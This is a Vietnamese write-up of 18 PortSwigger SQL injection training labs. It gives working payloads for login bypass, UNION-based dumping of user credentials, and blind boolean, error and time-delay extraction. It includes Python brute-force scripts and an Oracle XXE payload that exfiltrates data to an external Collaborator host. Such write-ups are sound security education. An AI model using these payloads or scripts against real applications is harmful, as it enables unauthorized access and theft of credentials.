# SQL Injection Writeups LAB
## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Description: Ta cần display 1 hoặc nhiều product không được phát hành để pass bài lab với câu query trong database cho trước
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
Để pass bài lab này, ta chỉ cần sử dụng case cơ bản nhất của SQLi `' OR 1=1--'`
![image](https://hackmd.io/_uploads/H1LxSsJ2a.png)

## Lab 2: SQL injection vulnerability allowing login bypass
Description: Thực hiện SQLi attack để đăng nhập làm admin
Case đơn giản nhất ta chỉ cần nhập `username=administrator'--` với password tùy ý, ta sẽ log in với quyền của admin.
Câu query trong database có thể là `SELECT * FROM users WHERE username='administrator'-- AND password='...'`
![image](https://hackmd.io/_uploads/HJJ48iy3T.png)

## Lab 3: SQL injection attack, querying the database type and version on Oracle
Description: Display version của database
Các bước đầu tiên khi thực hiện SQLi attack, check query dùng dấu `'` hay `"`, sau đó xem câu `SELECT` trước dùng mấy cột với `ORDER BY`, tiếp theo xem từng cột dùng loại datatype nào bằng cách sử dụng thử 1 chuỗi để check từng cột. Rồi xem cột nào được display thì sẽ dùng nó để đi sau vào UNION attack.

Bài hiện tại là dùng Oracle nên có chút hơi khác biệt.
- Mỗi lệnh SELECT là phải dùng FROM DUAL
- Xác định loại và version `SELECT banner FROM v$version`, `SELECT version FROM v$instance`

Với bài này, ta sẽ theo luồng như sau (Nhớ URL encode các query)
```
' OR 1=1--
' ORDER BY 2-- (Khi dùng ORDER BY 3 sẽ gặp lỗi -> Có 2 cột)
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT 'a','a' FROM DUAL-- (Cả 2 cột đều dùng string)
' UNION SELECT banner,NULL FROM v$version--
```

![image](https://hackmd.io/_uploads/HkzJCjk2T.png)

## Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft
Description: Display version của database
Tương tự bài ở trên, ta sẽ theo luồng như sau (MySQL sử dụng comment là `#` hoặc `-- -`)
```
' OR 1=1#
' ORDER BY 2# (Khi dùng ORDER BY 3 sẽ gặp lỗi -> Có 2 cột)
' UNION SELECT NULL,NULL#
' UNION SELECT 'a','a'# 
' UNION SELECT @@version,NULL#
```

![image](https://hackmd.io/_uploads/rJz_k2kn6.png)


## Lab 5: SQL injection attack, listing the database contents on non-Oracle databases
Description: Sử dụng UNION attack để thu thập thông tin của các bảng trong database và lấy được password của admin rồi đăng nhập bằng admin

Luồng thực hiện sẽ như sau
```
' OR 1=1--
' ORDER BY 2-- 
' UNION SELECT NULL,NULL--
' UNION SELECT 'a','a'-- 
' UNION SELECT table_name,NULL FROM information_schema.tables-- 
#Một số bài khác có thể dùng UNION SELECT * FROM information_schema.tables WHERE table_schema=database()
-> 1 table đáng chú ý : users_mzrzdr
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_mzrzdr'-- 
-> Ta được 2 cột của username và password:username_wbuatx và password_gljvzb
' UNION SELECT username_wbuatx,password_gljvzb FROM users_mzrzdr--
-> Password của admin: q835f1h8mztlw0dlifhf
=> Đăng nhập và solve lab
```
![image](https://hackmd.io/_uploads/SJMnHn13a.png)

## Lab 6: SQL injection attack, listing the database contents on Oracle
Description: Sử dụng UNION attack để thu thập data từ các bảng rồi đăng nhập làm admin để pass bài lab này.
Bài lab này giống bài lab trước, nhưng mà Oracle có chút khác biệt so với các database khác, SELECT phải đi với DUAL, information_schema.tables thay bằng all_tables, information_schema.columns thay bằng all_tab_columns
```
' OR 1=1--
' ORDER BY 2-- 
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT 'a','a' FROM DUAL-- 
' UNION SELECT table_name,NULL FROM all_tables-- 
-> 1 table đáng chú ý : USERS_RDICMB
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_RDICMB'-- 
-> Ta được 2 cột của username và password:USERNAME_CZEXEA và PASSWORD_WKJECT
' UNION SELECT USERNAME_CZEXEA,PASSWORD_WKJECT FROM USERS_RDICMB--
-> Password của admin: 5gztht9nmdw1zvtxvev5
=> Đăng nhập và solve lab
```
![image](https://hackmd.io/_uploads/SyMQ1jl2a.png)

## Lab 7: SQL injection UNION attack, determining the number of columns returned by the query
Description: Xác định số cột trả về bởi câu query bằng cách sử dụng UNION attack
Do bài này chỉ yêu cầu xác định số cột, cho nên dùng ORDER BY để check số cột là được, sau đó dùng UNION SELECT để pass bài lab
```
' OR 1=1--
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--
```

## Lab 8: SQL injection UNION attack, finding a column containing text
Description: Xác định cột nào sử dụng datatype là string bằng UNION attack, và khiến databasse hiện string 'sbYahD' để pass bài lab
Bài này thì sau khi thực hiện các bước như bài trên, chỉ cần thay 1 string vào từng chữ NULL để check xem cột nào dùng string thôi.
```
' OR 1=1--
' ORDER BY 3--
' UNION SELECT NULL,'sbYahD',NULL-- 
```

![image](https://hackmd.io/_uploads/BJO6Qol3T.png)

## Lab 9: SQL injection UNION attack, retrieving data from other tables
Description: Trong description của bài đã nêu rõ có 1 bảng khác là `users` chứa 2 cột `username` và `password`. Sử dụng UNION attack để lấy được tất cả `username` và `password` rồi đăng nhập làm admin để pass bài lab.
```
' OR 1=1--
' ORDER BY 2--
' UNION SELECT NULL,NULL-- 
' UNION SELECT 'a','a'-- 
' UNION SELECT username,password FROM users-- 
```
![image](https://hackmd.io/_uploads/H1wfriehp.png)
Login làm admin và pass bài lab
![image](https://hackmd.io/_uploads/HkIBrsena.png)

## Lab 10: SQL injection UNION attack, retrieving multiple values in a single column
Description: Trong description của bài đã nêu rõ có 1 bảng khác là `users` chứa 2 cột `username` và `password`. Sử dụng UNION attack để lấy được tất cả `username` và `password` rồi đăng nhập làm admin để pass bài lab.

```
' OR 1=1--
' ORDER BY 2--
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,'a'-- (Chỉ có cột thứ 2 là string)
```
Bài này nếu đơn giản thì chỉ cần payload bên dưới để lấy password của administrator do đề bài đã cho tên bảng với các cột
`' UNION SELECT NULL,password FROM users WHERE username='administrator'--`
Nhưng bài lab này muốn hướng đến việc sử dụng concat string để list tất cả dữ liệu trong bảng chỉ với 1 cột duy nhất (Tên bài lab).
Check database sử dụng loại nào với phiên bản
`' UNION SELECT NULL,version()--`
Mình thấy database dùng loại Postgres
![image](https://hackmd.io/_uploads/rJsc81Zha.png)
Search keywork **postgre select with concat string mark**, mình được 
![image](https://hackmd.io/_uploads/BJApLJZhp.png)
Cho nên payload sẽ là `' UNION SELECT NULL,username || ':' || password FROM users--`
Dấu `:` để ngăn cách username với password. Nhập username và password của administrator ta sẽ pass bài lab này.

## Lab 11: Blind SQL injection with conditional responses
Description: Challenge blind SQLi đầu tiên, kết quả của các câu query sẽ không được display, thậm chí là lỗi cũng không được display. Nhưng app sẽ bao gồm 1 "Welcome back" message khi query trả về bất kỳ row nào. 
Có 1 bảng users chứa 2 cột username với password. Tìm cách lấy được password của admin và đăng nhập. Và lỗ hổng này xuất hiện ở cookie TrackingId

Ta sẽ check các dấu `'` hay `"`, rồi dấu comment `--` hay `#` dấu nào hợp lệ.
Ta được: `cookie: TrackingId=jE8Gp9AO7VaIUkVR'+OR+1=1--;session=cVmOaF2JVU0PLsjtGxuODJmhPeQrofxd`

Vì đây là blind SQLi nên ta không thể sử dụng UNION attack mà ta sẽ dùng substring để tìm từng chữ cái của 1 giá trị nào đó, có thể là table name, column name nhưng ở đây đề bài đã cung cấp tên bảng `users` có 2 cột `username` và `password`

Check length của password với payload
`cookie: TrackingId=jE8Gp9AO7VaIUkVR'+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a;session=cVmOaF2JVU0PLsjtGxuODJmhPeQrofxd`
Ta sẽ được length của password là 20.
Nếu password ở đây chứa các kí tự viết hoa, viết thường, kí tự đặc biệt, số thì mình sẽ thay đổi giá trị `string.ascii_lowercase + string.digits` nhưng mà hint là chỉ có lowercase và digit cho nên viết vậy để chạy nhanh hơn. Còn nếu không phải check `=` từng chữ cái chứ không sử dụng dấu `>`. 

```python=
import requests
import string
url = 'https://0a7600b00470eef9853ec7ff00f90073.web-security-academy.net/'
session = 'cVmOaF2JVU0PLsjtGxuODJmhPeQrofxd'
trackId = 'jE8Gp9AO7VaIUkVR'
password = ""
for i in range(1,21):
    check = False
    for j in [x for x in string.ascii_lowercase + string.digits][::-1]:
    trackingValue = f"{trackId}'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)>'{j}"
        cookie_values = {'TrackingId': trackingValue, 'session': session}
        response = requests.get(url, cookies=cookie_values)
        if 'Welcome back' in response.text:
            check = True
            password += chr(ord(j) + 1)
            break
    if not check:
        trackingValue = f"{trackId}'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)>'z"
        cookie_values = {'TrackingId': trackingValue, 'session': session}
        response = requests.get(url, cookies=cookie_values)
        if 'Welcome back' in response.text:
            password += 'z'
        else:
            password += '9'

print(password)
```

Một cách khác là mình sẽ dùng Burp Intruder nhưng mà chỉnh tay khá là chậm và mình cũng muốn viết script một chút để nâng trình.

## Lab 12: Blind SQL injection with conditional errors
Description: Database chứa 1 bảng là users có 2 cột là username và password. Tấn công blind SQLi để lấy được pass của admin và đăng nhập. Kết quả của query SQL sẽ không được trả về, app sẽ không response, nhưng nếu có lỗi, nó sẽ hiện lên.

Khi đọc docs của portswigger, mình có thể sử dụng câu query sau để làm bài lab này. 
`SELECT CASE WHEN (CONDITION) THEN a ELSE b END`

Đại khái thì nó giống toán tử 3 ngôi trong các ngôn ngữ lập trình hiện đại, nếu condition của bạn đúng thì nó sẽ trả về a, nếu không thì nó sẽ trả về b. 
Ở đây, nếu muốn kích hoạt 1 lỗi với câu query trên nó sẽ có dạng như sau
```sql=
(SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
```

Nếu bạn sử dụng payload thứ 2 thì nó sẽ lỗi, do 1=1 đúng nên nó sẽ trả về 1/0 - một phép chia không hợp lệ và sẽ lỗi. 
Trong cheatsheet của portswigger có đầy đủ lỗi này với các database phổ biến
![image](https://hackmd.io/_uploads/rJrTeUf3p.png)

Đối với bài lab này, mình thử payload trong docs không được cho nên thử trong cheatsheet với payload của Oracle thì đúng. 
![image](https://hackmd.io/_uploads/H17BWLG3T.png)
![image](https://hackmd.io/_uploads/SkDHWUM3p.png)

Xác định database thành công, tiếp theo đi sâu hơn. Mình đã có tên table cùng với 2 cột mà đề cung cấp.

Đầu tiên sử dụng thử payload trong docs, nhưng mà cái nào cũng hiện lỗi. Điêu ác !?
`sA1EYisedbBhBIcp' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='b') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a`

Sau đó, chuyển phần `username = 'administrator'` xuống sau `FROM users` thì mới được. (Do check thử 2 payload với intruder)
`sA1EYisedbBhBIcp' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='z') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`

Còn check length của password nữa với payload sau và `len(password) = 20`
`sA1EYisedbBhBIcp' AND (SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`

Mình sử dụng lại script ở bài trước
```python=
import requests
import string
url = 'https://0a53002d038957c580d2406600c30067.web-security-academy.net'
session = '3bk8ou8UinagMfLUICNl3lxEav61J8Py'
trackId = 'sA1EYisedbBhBIcp'
password = ""
for i in range(1,21):
    check = False
    for j in [x for x in string.ascii_lowercase + string.digits][::-1]:
        trackingValue = f"{trackId}' AND (SELECT CASE WHEN (SUBSTR(password,{i},1)='{j}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
        cookie_values = {'TrackingId': trackingValue, 'session': session}
        response = requests.get(url, cookies=cookie_values)
        if 'Internal Server Error' in response.text:
            check = True
            password += chr(ord(j) + 1)
            break

print(password)
```

## Lab 13: Visible error-based SQL injection
Description: Database chứa 1 bảng là users có 2 cột là username và password. Tấn công blind SQLi để lấy được pass của admin và đăng nhập.

Khi database hiển thị những lỗi khá là chi tiết bao gồm cả câu query trong đó thì nó cũng khá là tương tự với in-band SQLi. Đối với type này thì ta có thể sử dụng hàm CAST bao gồm trong đó là các câu SELECT để khai thác

Khi thêm 1 dấu `'`, web display thông báo sau
![image](https://hackmd.io/_uploads/SkOzRLM2T.png)

Bây giờ ta sẽ xác định loại database mà server sử dụng. 
Đầu tiên là payload của Microsoft SQL server. (Do sử dụng AND nên sau đó phải là 1 expression)
![image](https://hackmd.io/_uploads/ry_yeI7hp.png)
Syntax error -> không phải Microsoft SQL server

Tiếp theo đến PostgreSQL
![image](https://hackmd.io/_uploads/HJJ0lU726.png)
Ở đây, chữ 'foo' không thể chuyển thành int nên xuất hiện lỗi invalid syntax for type integer -> Server sử dụng PostgreSQL

![image](https://hackmd.io/_uploads/r1Bu-Imhp.png)
Khi mình sử dụng payload như trên hình thì gặp lỗi unterminated string literal và câu query xuất hiện trên hình chỉ đến chữ WHERE, có vẻ như back-end đã cắt đi câu query ban đầu. 
Mình đếm được, backend cho phép 60 kí tự, nhưng mà payload đầy đủ phải là 
`NDKoSws4fwztXr7n' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--`

Khoảng hơn 90 kí tự, ta có thể xóa đi trackingValue ban đầu để giảm độ dài của payload do khi xóa thử 1 kí tự trong đó thì không ảnh hưởng gì (vì chúng ta không cần đăng nhập). Nhưng sau khi xóa đi, thì payload của chúng ta vẫn còn hơn 80 kí tự. 
Mình sẽ thử lấy từng cột để xem có gì hay không.

![image](https://hackmd.io/_uploads/BJWBm873a.png)

Payload trả về nhiều dòng trong table, ta có thể sử dụng LIMIT 1 để lấy chỉ 1 dòng đầu.

![image](https://hackmd.io/_uploads/H1vKXI73T.png)

Có vẻ như, user đầu tiên là admin -> lấy password của admin

![image](https://hackmd.io/_uploads/Sk0jmLm3p.png)

Đăng nhập và pass bài lab.
Loại visible error message như bài lab này chỉ là để tham khảo thêm thôi.

## Lab 14: Blind SQL injection with time delays
Description: Kết quả của truy vấn SQL không được trả về và ứng dụng không phản hồi theo bất kỳ cách nào khác nhau dựa trên việc truy vấn trả về bất kỳ hàng nào hay gây ra lỗi. Tuy nhiên, do truy vấn được thực hiện đồng bộ nên có thể kích hoạt độ trễ thời gian có điều kiện để suy ra thông tin. Để pass bài lab, hãy khai thác lỗ hổng SQL để gây ra độ trễ 10 giây.

Với các payload có trong cheatseat, mình thử với các payload dễ nhất do nhìn payload của Oracle và Microsoft thì không biết nó đi với cái gì để tạo ra 1 payload hợp lệ.
`Cookie: TrackingId=...'||(SELECT pg_sleep(10))--`


## Lab 15: Blind SQL injection with time delays and information retrieval
Description: Kết quả của các SQL query không được trả về, app không respond bất kỳ sự khác biệt nào dựa trên số row trả về hay bất kỳ lỗi nào. Tuy nhiên, vì query được thực thi đồng bộ nên vẫn có thể trigger tiem delay.
Database có 1 table gọi là `users` với 2 cột `username` và `password`. Lấy password của admin và đăng nhập để pass bài lab.

Đầu tiên, ta check xem database là loại nào. Bài lab này cũng sử dụng PostgreSQL khi mình check thử payload
`TrackingId=LS6RLhn6Dt8Z9cxK'||(SELECT pg_sleep(10))--`

Tiếp theo đó, mình xác định len của password với payload
`LS6RLhn6Dt8Z9cxK'||(SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
Nếu điều kiện đúng (ở đây length password > 1) thì sẽ delay 10s. Nếu không thì sẽ được respond luôn. Length password vẫn là 20.

Xác định từng kí tự của password với payload 
`LS6RLhn6Dt8Z9cxK'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`

Bài này không biết viết script thế nào nên chạy bằng Burp Suite Pro cho sướng. Hơi cực tí thôi.
![image](https://hackmd.io/_uploads/HJzu_q4hp.png)

## Lab 16: Blind SQL injection with out-of-band interaction
Description: SQL query được thực hiện không đồng bộ và không ảnh hưởng đến app response. Tuy nhiên bạn có thể trigger 1 cái out-of-band interaction với domain bên ngoài. Để pass bài lab, hãy sử SQLi gây ra 1 DNS lookup tới Burp Collaborator.

Tìm 1 payload có trong cheatseet và thử. Thử payload của Oracle và được luôn. Payload kia chỉ là copy vào xong Ctrl + U để URL-encode nên nhìn nó hơi rối.
![image](https://hackmd.io/_uploads/Bk2pccV2a.png)

![image](https://hackmd.io/_uploads/Hk-Jj9N2p.png)


## Lab 17: Blind SQL injection with out-of-band data exfiltration
Description: SQL query được thực hiện không đồng bộ và không ảnh hưởng đến app response. Tuy nhiên bạn có thể trigger 1 cái out-of-band interaction với domain bên ngoài. 
Database có 1 table là `users` với 2 column `username` và `password`. Lấy password của administrator và login để pass bài lab.

Sử dụng payload trong phần cheatseet để exploit. Payload của Oracle.
![image](https://hackmd.io/_uploads/S1Uhhc43T.png)

![image](https://hackmd.io/_uploads/Hy0EyoEhT.png)
Phần subdomain của dòng đen kia là password của admin.

P/S: Lúc đầu mình tưởng là phần response trong HTTP kia là password. 
```sql=
SELECT EXTRACTVALUE(xmltype('
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>
'),'/l') FROM dual
```

Phân tích payload một chút, ta có 1 DOCTYPE tên là root. Ở đây có khai báo 1 thực thể (Entity) tên là remote và được khai báo gồm dấu `%` và parameter entity của nó được tham chiếu sử dụng dấu `%`. Entity này đi với từ khóa `SYSTEM` được sử dụng để xác định 1 đối tượng bên ngoài chứa định nghĩa của DTD (document type definition - là tài liệu để định nghĩa kiểu dữ liệu cho các phần tử của XML document. Khi đọc XML document, chỉ cần đọc DTD là biết được cấu trúc XML (Thẻ `!DOCTYPE`)). Đối tượng bên ngoài này là subdomain của Burp Collab mà chúng ta host, với subdomain ở đây là câu query mà chúng ta muốn thực hiện. 
Parameter thứ hai của hàm xmltype là /l, nó lấy hết phần tử con trực tiếp của phần tử gốc. Phần tử gốc ở đây là thẻ `<?xml>` vì vậy nó lấy thẻ `DOCTYPE`.
Hàm `EXTRACTVALUE` được sử dụng để trích xuất giá trị của 1 phần từ XML.


## Lab 18: SQL injection with filter bypass via XML encoding
Description: Database chứa 1 `users` table chứa username và password của các user. Để pass bài lab thì sử dụng SQLi để lấy được thông tin tài khoản admin để đăng nhập.
Lỗ hổng ở bài này không phải ở cookie như mấy bài trước mà ở chức năng checkstock trong các mặt hàng. Nó có chứa 1 đoạn xml.
![image](https://hackmd.io/_uploads/HJhN1kDhp.png)

Trong request mình thử thay đổi cả productId và storeId thành 1+1 để xem cách input của mình được đánh giá thì đều có sự khác biệt. Mình thấy nó trả về giá trị của 1 stock khác. -> Nó sử dụng 1 câu query đến database để lấy value

Thử 1 payload trong storedId `1 ORDER BY 3` thì response trả về 0 units. Có vẻ như câu query đã sai nên không có giá trị nào trả về và mặc định sẽ là 0 units
![image](https://hackmd.io/_uploads/ByexmQ1w2p.png)

Khi mình sử dụng `1 ORDER BY 1` thì đã có giá trị trả về, có vẻ như câu query trước đến database chỉ có 1 cột. Khi đó mình sử dụng payload `1 UNION SELECT NULL` thì backend đã phát hiện và response
![image](https://hackmd.io/_uploads/ByftXJDhT.png)

Khi đó, ta có thể sử dụng Hackvertor
![image](https://hackmd.io/_uploads/SJP2XJDha.png)
Mình thấy đã có sự khác biệt trong response.

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

937 units
null
```

P/S: Thử payload ở productId sẽ không trả về kết quả do chỉ display giá trị ở storedId. 

Ta có thể sử dụng payload sau để list table trong database
`1 UNION SELECT table_name FROM information_schema.tables`
![image](https://hackmd.io/_uploads/Bkut4JD3T.png)
Nhưng đề đã cho tên bảng rồi thì chỉ cần xác định cột trong bảng users với payload `1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'`

![image](https://hackmd.io/_uploads/r1qnVyD3p.png)

Do UNION chỉ có 1 cột nhưng ta cần retrieve 2 cột của bảng này nên mình sẽ sử dụng payload `1 UNION SELECT username || ':' || password FROM users` như trong 1 bài lab trước (Lab 10)

![image](https://hackmd.io/_uploads/BJXLS1wn6.png)


